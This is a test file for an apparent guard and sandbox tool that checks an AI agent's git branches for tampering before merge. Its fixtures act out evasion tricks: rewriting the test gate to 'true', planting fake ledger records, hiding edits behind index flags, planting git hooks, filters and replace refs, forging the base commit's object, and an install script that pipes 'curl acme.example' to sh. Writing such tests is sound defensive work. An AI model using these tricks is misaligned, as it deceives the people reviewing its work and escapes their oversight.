  const dir = await acme(t, { climb: { jobs: ['test-time'], testCommand: 'npm run check' }, config: { check: 'npm run check' }, files: { 'package.json': pkg(LEDGER_TEST), 'acme.test.mjs': suite('acme adds') } });
  const base = git(dir, ['rev-parse', 'HEAD']);
  const at = async (branch, files) => { git(dir, ['checkout', '-q', '-f', '-b', branch, base]); return commit(dir, files, `acme: ${branch}`); };
  await at('plain', { 'acme.test.mjs': `${suite('acme adds')}// shared fixture\n` });
  const plain = climb(dir, ['guard', '--base', base, '--json']);
  assert.equal(plain.status, 0, plain.stdout + plain.stderr);
  assert.doesNotMatch(json(plain).line, /changed the gate's scripts/);
  await at('faster', { 'package.json': pkg(LEDGER_TEST.replace('node --test', 'node --test --test-concurrency=4')) });
  const faster = climb(dir, ['guard', '--base', base, '--json']);
  assert.equal(faster.status, 0, faster.stdout + faster.stderr);
  assert.match(json(faster).line, /; the branch changed the gate's scripts \(package\.json: "check"\), so its own scripts wrote the records compared: a person checks the gate still runs the base's tests$/);
  // PR #59: a gate script rewritten to `true` records nothing where the base's ran its tests: refused (exit 1), never a pass.
  await at('true', { 'package.json': pkg('true') });
  const blind = climb(dir, ['guard', '--base', base, '--json']);
  assert.equal(blind.status, 1, blind.stdout + blind.stderr);
  assert.match(json(blind).problems.join('\n'), /^the gate `npm run check` exited 0 on [0-9a-f]{7} but recorded no test ledger run, where the base [0-9a-f]{7}'s ran 1 tests/);
});

// PR #59: the guard holds what it checked across the agent's code it runs. git status cannot see an edit
// behind an index flag, so the flags are read apart and every tracked file is read from disk; and the git
// dir (its config, hooks, attributes and replace refs) is held from disk, before the base's gate runs in a
// worktree that shares it.
test('guard: an index flag the gate set, an edit behind a flag set before the guard looked, and a git config or replace ref the gate planted are refused; the base\'s gate never runs on a planted git dir, and keel\'s git runs no hook', async t => {
  const dir = await acme(t, { climb: { jobs: ['test-time'], testCommand: LEDGER_TEST }, config: { check: LEDGER_TEST }, files: { 'acme.test.mjs': suite('acme adds', 'acme subtracts'), 'acme.bin': Buffer.from([0x61, 0xff, 0x0a]) } });
  const base = git(dir, ['rev-parse', 'HEAD']);
  git(dir, ['checkout', '-q', '-b', 'refactor']);
  const checked = await commit(dir, { 'acme.test.mjs': `${suite('acme adds', 'acme subtracts')}// shared fixture\n` }, 'acme: refactor');
  const cfg = JSON.parse(await readFile(join(dir, '.keel/keel.json'), 'utf8'));
  const scratch = await mkdtemp(join(tmpdir(), 'keel-guard-held-'));
  t.after(() => rm(scratch, { recursive: true, force: true }));
  const runs = join(scratch, 'gate-runs');
  /** The guard, with a gate that counts its runs (the candidate's, then the base's) and then runs `tail`. */
  const guardWith = async tail => {
    await rm(runs, { force: true });
    await writeFile(join(dir, '.keel/keel.json'), JSON.stringify({ ...cfg, check: `echo ran >> "${runs}" && ${LEDGER_TEST}${tail ? ` && ${tail}` : ''}` }));
    return climb(dir, ['guard', '--base', base, '--json']);
  };
  const gateRuns = async () => (await readFile(runs, 'utf8')).trim().split('\n').length;
  const clean = () => {
    for (const flag of ['--no-assume-unchanged', '--no-skip-worktree']) for (const f of ['acme.test.mjs', 'acme.bin']) git(dir, ['update-index', flag, f]);
    git(dir, ['reset', '-q', '--hard', checked]);
  };

  // A hook in the git dir before the guard looked (the git dir is as it was after the gate): keel's git runs
  // it never, though the base's worktree is checked out (post-checkout) under it.
  const mark = join(scratch, 'hook-ran');
  await writeFile(join(dir, '.git/hooks/post-checkout'), `#!/bin/sh\ntouch "${mark}"\n`, { mode: 0o755 });
  const honest = await guardWith('');
  assert.equal(honest.status, 0, honest.stdout + honest.stderr);
  assert.equal(await gateRuns(), 2, 'the base\'s gate first (#82), then the candidate\'s');
  assert.equal(existsSync(mark), false, 'a hook in the git dir ran from keel\'s git (core.hooksPath)');
  await rm(join(dir, '.git/hooks/post-checkout'));

  for (const [why, tail, said] of [
    ['assume-unchanged, then an edit', 'git update-index --assume-unchanged acme.test.mjs && echo "// more" >> acme.test.mjs', /set or cleared an index flag after the guard's checks \(assume-unchanged or skip-worktree: h acme\.test\.mjs\)/],
    ['skip-worktree, then an edit', 'git update-index --skip-worktree acme.test.mjs && echo "// more" >> acme.test.mjs', /set or cleared an index flag after the guard's checks \(assume-unchanged or skip-worktree: S acme\.test\.mjs\)/],
    ['a config planted', 'git config acme.planted yes', /changed the git dir's config, hooks or attributes, or its replace refs/],
    // -f: the same command is the base's gate too (#82: it runs first), which makes the ref before the candidate's does.
    ['a replace ref planted', `git replace -f --graft ${base} ${checked}`, /changed the git dir's config, hooks or attributes, or its replace refs/],
  ]) {
    const g = await guardWith(tail);
    assert.equal(g.status, 1, `${why}: ${g.stdout}${g.stderr}`);
    assert.ok(json(g).problems.some(p => said.test(p)), `${why}: ${JSON.stringify(json(g).problems)}`);
    assert.equal(await gateRuns(), 2, `${why}: the base's gate ran first (#82), before any of the agent's code, then the candidate's`);
    if (why === 'a config planted') git(dir, ['config', '--unset', 'acme.planted']);
    if (why === 'a replace ref planted') git(dir, ['replace', '-d', base]);
    clean();
  }

  // A flag already set when the guard looked, then an edit behind it: the flags match and git status sees
  // nothing, but the files read from disk do not match.
  git(dir, ['update-index', '--assume-unchanged', 'acme.test.mjs']);
  const behind = await guardWith('echo "// more" >> acme.test.mjs');
  assert.equal(behind.status, 1, behind.stdout + behind.stderr);
  assert.ok(json(behind).problems.includes(`the gate \`echo ran >> "${runs}" && ${LEDGER_TEST} && echo "// more" >> acme.test.mjs\` changed a tracked file after the guard's checks (read from disk, though git status says nothing changed): nothing is taken`), JSON.stringify(json(behind).problems));
  assert.equal(await gateRuns(), 2, 'the base\'s gate first (#82), then the candidate\'s');
  clean();
  // Bytes, not text: a byte no encoding reads (0xff to 0xfe) is a change, behind a flag set before.
  const tend = await import(pathToFileURL(join(dir, 'scripts/keel/tend.mjs')).href);
  git(dir, ['update-index', '--skip-worktree', 'acme.bin']);
  const held = tend.treeState(dir);
  await writeFile(join(dir, 'acme.bin'), Buffer.from([0x61, 0xfe, 0x0a]));
  assert.equal(git(dir, ['status', '--porcelain', '--untracked-files=no']), '', 'git status sees no change to acme.bin');
  assert.deepEqual(tend.heldProblems(dir, held, 'the gate'), ['the gate changed a tracked file after the guard\'s checks (read from disk, though git status says nothing changed): nothing is taken']);
  clean();
});

// PR #59: the build and the project's perf check run before the gate and are the agent's code too: the guard
// holds the tree from before the first of them, not only across the gate.
test('guard: a perf check that stages a change or sets an index flag after the guard\'s checks is refused, though the gate after it passes', async t => {
  const perf = check => ({ jobs: ['perf'], perf: { command: 'node -e "console.log(1)"', better: 'higher', check } });
  const dir = await acme(t, { climb: perf('true'), config: { check: LEDGER_TEST }, files: { 'acme.test.mjs': suite('acme adds') } });
  const base = git(dir, ['rev-parse', 'HEAD']);
  git(dir, ['checkout', '-q', '-b', 'refactor']);
  const checked = await commit(dir, { 'acme.test.mjs': `${suite('acme adds')}// shared fixture\n` }, 'acme: refactor');
  const cfg = JSON.parse(await readFile(join(dir, '.keel/keel.json'), 'utf8'));
  const guardWith = async check => {
    await writeFile(join(dir, '.keel/keel.json'), JSON.stringify({ ...cfg, climb: perf(check) }));
    return climb(dir, ['guard', '--base', base, '--job', 'perf', '--json']);
  };
  const honest = await guardWith('true');
  assert.equal(honest.status, 0, honest.stdout + honest.stderr);
  for (const [check, said] of [
    ['echo "// sneak" >> acme.test.mjs && git add acme.test.mjs', /^the perf check `[^`]+` changed the tracked tree or the index after the guard's checks/],
    ['git update-index --skip-worktree acme.test.mjs && echo "// sneak" >> acme.test.mjs', /^the perf check `[^`]+` set or cleared an index flag after the guard's checks/],
    // #82: a filter the perf check plants is refused before the ledger's git status (which would run it) or the gate.
    ['git config filter.acme.clean "touch .filter-ran; cat" && echo "acme.test.mjs filter=acme" >> "$(git rev-parse --git-common-dir)/info/attributes" && touch acme.test.mjs', /^the perf check `[^`]+` changed the git dir's config, hooks or attributes/],
  ]) {
    const g = await guardWith(check);
    assert.equal(g.status, 1, `${check}: ${g.stdout}${g.stderr}`);
    assert.ok(json(g).problems.some(p => said.test(p)), `${check}: ${JSON.stringify(json(g).problems)}`);
    assert.equal(existsSync(join(dir, '.filter-ran')), false, `${check}: no filter it planted ran`);
    run('git', ['config', '--unset', 'filter.acme.clean'], { cwd: dir });
    await rm(join(dir, '.git/info/attributes'), { force: true });
    git(dir, ['update-index', '--no-skip-worktree', 'acme.test.mjs']);
    git(dir, ['reset', '-q', '--hard', checked]);
  }
});

// PR #59: the test ledger's reporter writes one record per suite it runs; a record more than the base's gate
// wrote is one the branch's own code wrote, and it could name tests the candidate's gate no longer runs.
test('guard: a ledger record the branch\'s own tests planted, naming a test its gate dropped, is refused by the count of records', async t => {
  const dir = await acme(t, { climb: { jobs: ['test-time'], testCommand: LEDGER_TEST }, config: { check: LEDGER_TEST }, files: { 'acme.test.mjs': suite('acme adds', 'acme subtracts') } });
  const base = git(dir, ['rev-parse', 'HEAD']);
  git(dir, ['checkout', '-q', '-b', 'lighter']);
  const planted = `import { test } from 'node:test';
import { readFileSync, writeFileSync, mkdirSync } from 'node:fs';
test('acme adds', () => {});
const head = readFileSync(\`.git/\${readFileSync('.git/HEAD', 'utf8').trim().replace('ref: ', '')}\`, 'utf8').trim();
mkdirSync('.keel/test-runs', { recursive: true });
writeFileSync('.keel/test-runs/0000-planted.json', JSON.stringify({ date: new Date().toISOString(), commit: head, tests: ['acme adds', 'acme subtracts'].map(name => ({ file: 'acme.test.mjs', name, outcome: 'pass' })) }));
`;
  await commit(dir, { 'acme.test.mjs': planted }, 'acme: a lighter suite');
  const g = climb(dir, ['guard', '--base', base, '--json']);
  assert.equal(g.status, 1, g.stdout + g.stderr);
  assert.match(json(g).problems.join('\n'), /^the gate `node --test [^`]+` left 2 test ledger records for [0-9a-f]{7} where the base [0-9a-f]{7}'s gate wrote 1: a record its own reporter did not write is in \.keel\/test-runs/);
});

// #82: a branch that changed the gate's scripts may split one test run into two, each a real record: the count is
// not held against it (every base test still has to run), and the gate line says the scripts changed.
test('guard: a branch that splits its test run in two through the gate\'s scripts passes, every base test run, the gate line saying so', async t => {
  const pkg = check => `${JSON.stringify({ name: 'acme', private: true, scripts: { check } }, null, 2)}\n`;
  const dir = await acme(t, { climb: { jobs: ['test-time'], testCommand: 'npm run check' }, config: { check: 'npm run check' }, files: { 'package.json': pkg(LEDGER_TEST), 'acme.test.mjs': suite('acme adds', 'acme subtracts') } });
  const base = git(dir, ['rev-parse', 'HEAD']);
  git(dir, ['checkout', '-q', '-b', 'split']);
  const half = LEDGER_TEST.replace('acme.test.mjs', 'acme-b.test.mjs');
  await commit(dir, { 'package.json': pkg(`${LEDGER_TEST} && ${half}`), 'acme.test.mjs': suite('acme adds'), 'acme-b.test.mjs': suite('acme subtracts') }, 'acme: two smaller runs');
  const g = climb(dir, ['guard', '--base', base, '--json']);
  assert.equal(g.status, 1, 'the split moves "acme subtracts" to another file: dropped from acme.test.mjs, as the ledger keys tests by file');
  // The same two files run as two invocations of the base's own tests, keyed alike: passes.
  git(dir, ['checkout', '-q', '-f', '-B', 'split2', base]);
  await commit(dir, { 'package.json': pkg(`${LEDGER_TEST.replace('acme.test.mjs', 'acme.test.mjs --test-name-pattern=adds')} && ${LEDGER_TEST.replace('acme.test.mjs', 'acme.test.mjs --test-name-pattern=subtracts')}`) }, 'acme: two smaller runs');
  const two = climb(dir, ['guard', '--base', base, '--json']);
  assert.equal(two.status, 0, two.stdout + two.stderr);
  assert.match(json(two).line, /the branch changed the gate's scripts/);
});

// PR #59: the sandbox walks each commit as well as the whole: a file changed in one commit and changed back
// in a later one is not in base..head, yet the branch's history carries it into main on any merge but a squash.
test('sandbox: an off-limits file, evidence or a runtime pin changed in one commit and changed back in a later one is refused; a runtime pin is an install file; keel\'s git reads no replace ref', async t => {
  const dir = await acme(t, { files: { 'acme.mjs': 'export const anvil = 1;\n', 'docs/evidence/2026-10-01-acme.md': '# Acme ordered\n' } });
  const base = git(dir, ['rev-parse', 'HEAD']);
  const sandbox = (head = 'HEAD') => climb(dir, ['sandbox', '--base', base, '--head', head, '--json']);
  for (const file of ['.github/workflows/acme.yml', 'scripts/keel/climb.mjs', '.keel/keel.json', 'docs/evidence/2026-10-01-acme.md', 'docs/evidence/2026-10-09-acme.md', '.nvmrc', 'web/.node-version', '.tool-versions', 'package-lock.json']) {
    git(dir, ['checkout', '-q', '-f', '-B', 'walk', base]);
    const was = await readFile(join(dir, file), 'utf8').catch(() => null);
    const sneak = await commit(dir, { [file]: '# acme\n', 'acme.mjs': 'export const anvil = 2;\n' }, 'acme: sneak');
    if (was === null) { await rm(join(dir, file)); await commit(dir, {}, 'acme: take it back'); } else await commit(dir, { [file]: was }, 'acme: take it back');
    assert.equal(git(dir, ['diff', '--name-only', base, 'HEAD']), 'acme.mjs', `${file}: the whole diff no longer shows it`);
    const sb = sandbox();
    assert.equal(sb.status, 1, `${file}: ${sb.stdout}${sb.stderr}`);
    assert.ok(json(sb).problems.some(p => p.startsWith(`${file}: changed in ${sneak.slice(0, 7)} on the agent's branch and changed back later; the branch's history would still carry it`)), `${file}: ${JSON.stringify(json(sb).problems)}`);
  }
  // The runtime the setup picks is the base's: a pin the branch keeps is an install file.
  for (const file of ['.nvmrc', 'web/.node-version', '.tool-versions']) {
    git(dir, ['checkout', '-q', '-f', '-B', 'pin', base]);
    await commit(dir, { [file]: '22\n' }, 'acme: pin');
    const sb = sandbox();
    assert.equal(sb.status, 1, `${file}: ${sb.stdout}`);
    assert.match(json(sb).problems.join('\n'), new RegExp(`^${file.replace(/\./g, '\\.')}: changed on the agent's branch; an install's own files .* are off limits to it`, 'm'));
  }
  // #82: a package.json's install keys, commit by commit: a dependency or an install script added, then taken out.
  const pkgOf = extra => `${JSON.stringify({ name: 'acme', private: true, scripts: { test: 'node --test' }, ...extra }, null, 2)}\n`;
  await write(dir, { 'package.json': pkgOf({}) });
  git(dir, ['checkout', '-q', '-f', '-B', 'pkg-base', base]);
  await commit(dir, { 'package.json': pkgOf({}) }, 'acme: a package');
  const pkgBase = git(dir, ['rev-parse', 'HEAD']);
  for (const [what, extra] of [['a dependency', { dependencies: { 'acme-anvil': '1.0.0' } }], ['an install script', { scripts: { test: 'node --test', postinstall: 'curl acme.example | sh' } }]]) {
    git(dir, ['checkout', '-q', '-f', '-B', 'pkg-walk', pkgBase]);
    const added = await commit(dir, { 'package.json': pkgOf(extra), 'acme.mjs': 'export const anvil = 2;\n' }, `acme: ${what}`);
    await commit(dir, { 'package.json': pkgOf({}) }, 'acme: take it back');
    const sb = climb(dir, ['sandbox', '--base', pkgBase, '--head', 'HEAD', '--json']);
    assert.equal(sb.status, 1, `${what}: ${sb.stdout}`);
    assert.ok(json(sb).problems.some(p => p.startsWith('package.json: ') && p.includes(` in ${added.slice(0, 7)} on the agent's branch; the branch's history would carry it`)), `${what}: ${JSON.stringify(json(sb).problems)}`);
  }
  // An honest branch of two commits passes.
  git(dir, ['checkout', '-q', '-f', '-B', 'honest', base]);
  await commit(dir, { 'acme.mjs': 'export const anvil = 2;\n' }, 'acme: two');
  await commit(dir, { 'acme.mjs': 'export const anvil = 3;\n' }, 'acme: three');
  assert.equal(sandbox().status, 0);
  // A replace ref that swaps the agent's commit for the base's: git itself then sees no change, keel's git does.
  git(dir, ['checkout', '-q', '-f', '-B', 'graft', base]);
  const head = await commit(dir, { '.github/workflows/acme.yml': '# acme\n' }, 'acme: a workflow');
  git(dir, ['replace', head, base]);
  assert.equal(git(dir, ['diff', '--name-only', base, head]), '', 'git itself reads the replace ref');
  const grafted = sandbox(head);
  assert.equal(grafted.status, 1, grafted.stdout);
  assert.match(json(grafted).problems.join('\n'), /^\.github\/workflows\/acme\.yml: changed on the agent's branch/m);
  git(dir, ['replace', '-d', head]);
});

// #82: in a linked worktree the git dir is .git/worktrees/<name>; its config, hooks and attributes live in the
// common one. The guard fingerprints both, so a filter the gate names there is refused before keel's git reads it.
test('guard in a linked worktree: a config the gate writes to the common git dir (a clean filter) is refused', async t => {
  const dir = await acme(t);
  const wt = join(dir, '..', `${dir.split('/').pop()}-linked`);
  git(dir, ['worktree', 'add', '-q', '--detach', wt]);
  t.after(() => rm(wt, { recursive: true, force: true }));
  const tend = await import(pathToFileURL(join(dir, 'scripts/keel/tend.mjs')).href);
  const held = tend.treeState(wt);
  assert.equal(held.gitDirs.length, 2, 'the worktree\'s git dir and the common one');
  assert.deepEqual(tend.heldProblems(wt, held, 'the gate'), [], 'nothing moved yet');
  git(wt, ['config', 'filter.acme.clean', 'cat']);
  assert.match(tend.heldProblems(wt, held, 'the gate').join('\n'), /^the gate changed the git dir's config, hooks or attributes, or its replace refs/);
});

// #82: a test run twice in one gate, passing then failing behind `|| true`, is a failure: every record is read
// before a test's runs are merged into one.
test('guard: a test that passes in one run of the gate and fails in another, behind || true, is refused', async t => {
  const pkg = check => `${JSON.stringify({ name: 'acme', private: true, scripts: { check } }, null, 2)}\n`;
  const flaky = `import { test } from 'node:test';\nimport { existsSync, writeFileSync } from 'node:fs';\ntest('acme adds', () => { if (existsSync('.ran-once')) throw new Error('second run fails'); writeFileSync('.ran-once', ''); });\n`;
  const dir = await acme(t, { climb: { jobs: ['test-time'], testCommand: 'npm run check' }, config: { check: 'npm run check' }, files: { 'package.json': pkg(`rm -f .ran-once && ${LEDGER_TEST}`), 'acme.test.mjs': suite('acme adds') } });
  const base = git(dir, ['rev-parse', 'HEAD']);
  git(dir, ['checkout', '-q', '-b', 'twice']);
  await commit(dir, { 'package.json': pkg(`rm -f .ran-once && ${LEDGER_TEST} && (${LEDGER_TEST} || true)`), 'acme.test.mjs': flaky, '.gitignore': '.ran-once\n' }, 'acme: run it twice');
  const g = climb(dir, ['guard', '--base', base, '--json']);
  assert.equal(g.status, 1, g.stdout + g.stderr);
  assert.match(json(g).problems.join('\n'), /^failed: acme\.test\.mjs "acme adds" failed on [0-9a-f]{7}, though the gate `npm run check` exited 0$/m);
});

// #82: the checkout's .git pointed at another git dir (same HEAD and index, other config) is refused before keel's
// next git reads it.
test('guard in a linked worktree: a .git pointer moved to another git dir is refused', async t => {
  const dir = await acme(t);
  const wt = join(dir, '..', `${dir.split('/').pop()}-moved`);
  git(dir, ['worktree', 'add', '-q', '--detach', wt]);
  t.after(() => rm(wt, { recursive: true, force: true }));
  const tend = await import(pathToFileURL(join(dir, 'scripts/keel/tend.mjs')).href);
  const held = tend.treeState(wt);
  const other = join(dir, '..', `${dir.split('/').pop()}-othergit`);
  t.after(() => rm(other, { recursive: true, force: true }));
  await cp(held.gitDir, other, { recursive: true });
  await writeFile(join(wt, '.git'), `gitdir: ${other}\n`);
  assert.match(tend.heldProblems(wt, held, 'the gate').join('\n'), /^the gate changed where the checkout's git dir is/);
});

// #82: the candidate's own code can overwrite the base commit's loose object with its own commit's content (git
// reads a loose object without checking it hashes to its name). The base's gate runs first, before any of the
// agent's code, so the base it measures is the real base, and the dropped test is seen.
test('guard: a candidate whose test rewrites the base commit\'s object to look like itself is still compared with the real base', async t => {
  const dir = await acme(t, { climb: { jobs: ['test-time'], testCommand: LEDGER_TEST }, config: { check: LEDGER_TEST }, files: { 'acme.test.mjs': suite('acme adds', 'acme subtracts') } });
  const base = git(dir, ['rev-parse', 'HEAD']);
  git(dir, ['checkout', '-q', '-b', 'forge']);
  const forger = `import { test } from 'node:test';
import { readFileSync, writeFileSync, rmSync } from 'node:fs';
import { inflateSync, deflateSync } from 'node:zlib';
test('acme adds', () => {});
const loose = s => \`.git/objects/\${s.slice(0, 2)}/\${s.slice(2)}\`;
const head = readFileSync(\`.git/\${readFileSync('.git/HEAD', 'utf8').trim().replace('ref: ', '')}\`, 'utf8').trim();
const commit = inflateSync(readFileSync(loose(head)));
const parent = /\\nparent ([0-9a-f]{40})/.exec(commit.toString('latin1'))[1];
rmSync(loose(parent), { force: true });
writeFileSync(loose(parent), deflateSync(commit));
`;
  await commit(dir, { 'acme.test.mjs': forger }, 'acme: a lighter suite');
  const g = climb(dir, ['guard', '--base', base, '--json']);
  assert.equal(g.status, 1, g.stdout + g.stderr);
  assert.deepEqual(json(g).missing, [{ file: 'acme.test.mjs', name: 'acme subtracts', how: 'dropped' }]);
});

// #83: a merge answers only for what it introduced. A branch that merges a default branch which changed a workflow
// (a release, say) is not refused for the workflow; one whose merge itself brings an off-limits change is.
test('sandbox: a merge of a default branch that changed a workflow passes; a merge that itself changes one is refused', async t => {
  const dir = await acme(t, { files: { 'acme.mjs': 'export const anvil = 1;\n' } });
  const start = git(dir, ['rev-parse', 'HEAD']);
  git(dir, ['checkout', '-q', '-b', 'agent']);
  await commit(dir, { 'acme.mjs': 'export const anvil = 2;\n' }, 'acme: the agent\'s change');
  git(dir, ['checkout', '-q', 'main']);
  const main = await commit(dir, { '.github/workflows/acme.yml': 'name: acme\n' }, 'acme: a release changes a workflow');
  git(dir, ['checkout', '-q', 'agent']);
  git(dir, ['merge', '-q', '--no-edit', main]);
  const sb = climb(dir, ['sandbox', '--base', main, '--head', 'HEAD', '--json']);
  assert.equal(sb.status, 0, sb.stdout + sb.stderr);
  // The merge itself changing the workflow (an evil merge): refused.
  git(dir, ['reset', '-q', '--hard', 'HEAD^']);
  git(dir, ['merge', '-q', '--no-commit', main]);
  await write(dir, { '.github/workflows/acme.yml': 'name: acme, by the agent\n' });
  git(dir, ['add', '-A']);
  git(dir, ['commit', '-q', '--no-edit']);
  const evil = climb(dir, ['sandbox', '--base', main, '--head', 'HEAD', '--json']);
  assert.equal(evil.status, 1, evil.stdout);
  assert.match(json(evil).problems.join('\n'), /^\.github\/workflows\/acme\.yml: changed on the agent's branch/m);
  assert.ok(start);
});

// #85: two merges can take an older version of a protected file from one parent and put the base's back from
// another; neither shows in a combined diff. A merge is judged against the trusted base instead.
test('sandbox: two merges that restore an older workflow and then the base\'s are refused; a merge bringing the base\'s dependencies beside the agent\'s script change passes', async t => {
  const dir = await acme(t, { files: { 'acme.mjs': 'export const anvil = 1;\n', '.github/workflows/acme.yml': 'name: acme v1\n' } });
  const start = git(dir, ['rev-parse', 'HEAD']);
  const base = await commit(dir, { '.github/workflows/acme.yml': 'name: acme v2\n' }, 'acme: a release updates the workflow');
  git(dir, ['checkout', '-q', '-b', 'agent']);
  const x = await commit(dir, { 'acme.mjs': 'export const anvil = 2;\n' }, 'acme: the agent\'s change');
  // M1: X's tree with the older workflow, parents X and the older start; M2: X's tree, parents M1 and the base.
  await write(dir, { '.github/workflows/acme.yml': 'name: acme v1\n' });
  git(dir, ['add', '-A']);
  const older = git(dir, ['write-tree']);
  git(dir, ['reset', '-q', '--hard', x]);
  const m1 = git(dir, ['commit-tree', older, '-p', x, '-p', start, '-m', 'acme: merge the older start']);
  const m2 = git(dir, ['commit-tree', `${x}^{tree}`, '-p', m1, '-p', base, '-m', 'acme: merge the base']);
  assert.equal(git(dir, ['diff', '--name-only', base, m2]), 'acme.mjs', 'the whole diff shows only the agent\'s change');
  assert.equal(git(dir, ['diff-tree', '--cc', '--name-only', '-r', '--no-commit-id', m1]), '', 'the combined diff shows nothing for M1');
  const sb = climb(dir, ['sandbox', '--base', base, '--head', m2, '--json']);
  assert.equal(sb.status, 1, sb.stdout);
  assert.match(json(sb).problems.join('\n'), new RegExp(`^\\.github/workflows/acme\\.yml: the merge ${m1.slice(0, 7)} on the agent's branch leaves it unlike its first parent and unlike any default-branch commit it brought in`, 'm'));

  // The default branch updated a dependency; the agent's branch changed a test script; the merge brings both.
  const pkg = (deps, test) => `${JSON.stringify({ name: 'acme', private: true, scripts: { test }, dependencies: deps }, null, 2)}\n`;
  git(dir, ['checkout', '-q', '-f', 'main']);
  const s0 = await commit(dir, { 'package.json': pkg({ 'acme-anvil': '1.0.0' }, 'node --test') }, 'acme: a package');
  const b1 = await commit(dir, { 'package.json': pkg({ 'acme-anvil': '1.1.0' }, 'node --test') }, 'acme: a dependency update');
  git(dir, ['checkout', '-q', '-b', 'agent-pkg', s0]);
  await commit(dir, { 'package.json': pkg({ 'acme-anvil': '1.0.0' }, 'node --test --test-concurrency=4') }, 'acme: a faster test script');
  git(dir, ['merge', '-q', '--no-commit', b1], { allowFail: true });
  await write(dir, { 'package.json': pkg({ 'acme-anvil': '1.1.0' }, 'node --test --test-concurrency=4') });
  git(dir, ['add', '-A']);
  git(dir, ['commit', '-q', '-m', 'acme: merge the dependency update']);
  const merged = climb(dir, ['sandbox', '--base', b1, '--head', 'HEAD', '--json']);
  assert.equal(merged.status, 0, merged.stdout + merged.stderr);
});

// #85: a branch that merged the default branch twice, a workflow and a dependency changed each time, took exactly
// the default branch's each time: it passes, though the first merge's versions are older than the base's.
test('sandbox: two honest merges of the default branch, each bringing a newer workflow and dependency, pass', async t => {
  const pkg = v => `${JSON.stringify({ name: 'acme', private: true, scripts: { test: 'node --test' }, dependencies: { 'acme-anvil': v } }, null, 2)}\n`;
  const dir = await acme(t, { files: { 'acme.mjs': 'export const anvil = 1;\n', '.github/workflows/acme.yml': 'name: acme v1\n', 'package.json': pkg('1.0.0') } });
  const start = git(dir, ['rev-parse', 'HEAD']);
  git(dir, ['checkout', '-q', '-b', 'agent']);
  await commit(dir, { 'acme.mjs': 'export const anvil = 2;\n' }, 'acme: the agent\'s change');
  git(dir, ['checkout', '-q', 'main']);
  const b1 = await commit(dir, { '.github/workflows/acme.yml': 'name: acme v2\n', 'package.json': pkg('1.1.0') }, 'acme: release 1');
  git(dir, ['checkout', '-q', 'agent']);
  git(dir, ['merge', '-q', '--no-edit', b1]);
  git(dir, ['checkout', '-q', 'main']);
  const b2 = await commit(dir, { '.github/workflows/acme.yml': 'name: acme v3\n', 'package.json': pkg('1.2.0') }, 'acme: release 2');
  git(dir, ['checkout', '-q', 'agent']);
  git(dir, ['merge', '-q', '--no-edit', b2]);
  const sb = climb(dir, ['sandbox', '--base', b2, '--head', 'HEAD', '--json']);
  assert.equal(sb.status, 0, sb.stdout + sb.stderr);
  assert.ok(start);
});
